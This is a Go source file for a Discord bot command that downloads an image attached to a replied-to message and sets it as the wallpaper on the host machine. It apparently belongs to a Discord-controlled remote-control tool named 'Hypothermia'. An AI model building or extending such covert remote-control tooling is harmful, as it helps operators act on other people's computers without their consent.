package commands

import (
	"fmt"
	"path/filepath"
	"strings"

	"Hypothermia/src/utils"

	"github.com/bwmarrin/discordgo"
)

const (
	wpNoPicError string = "🟥 You need reply to an image."
	wpSuccess    string = "🟩 Successfully set wallpaper."
)

type WallpaperCommand struct{}

func (*WallpaperCommand) Run(s *discordgo.Session, m *discordgo.MessageCreate, args []string) error {
	if m.MessageReference == nil {
		_, err := s.ChannelMessageSendReply(m.ChannelID, wpNoPicError, m.Reference())
		return err
	}

	var imgURL string
	msg, _ := s.ChannelMessage(m.MessageReference.ChannelID, m.MessageReference.MessageID)

	for _, attachment := range msg.Attachments {
		ext := strings.ToLower(filepath.Ext(attachment.Filename))

		if ext == ".jpg" || ext == ".jpeg" || ext == ".png" || ext == ".gif" || ext == ".bmp" {
			imgURL = attachment.URL
			break
		}
	}

	if imgURL == "" {
		_, err := s.ChannelMessageSendReply(m.ChannelID, wpNoPicError, m.Reference())
		return err
	}

	path, err := utils.DonwloadFile(imgURL)
	if err != nil {
		_, err := s.ChannelMessageSendReply(m.ChannelID, fmt.Sprint(err), m.Reference())
		return err
	}

	err = utils.SetWallpaper(path)
	if err != nil {
		_, err := s.ChannelMessageSendReply(m.ChannelID, fmt.Sprint(err), m.Reference())
		return err
	}

	_, err = s.ChannelMessageSendReply(m.ChannelID, wpSuccess, m.Reference())
	return err
}

func (*WallpaperCommand) Name() string {
	return "wallpaper"
}

func (*WallpaperCommand) Info() string {
	return "sets the users wallpaper"
}
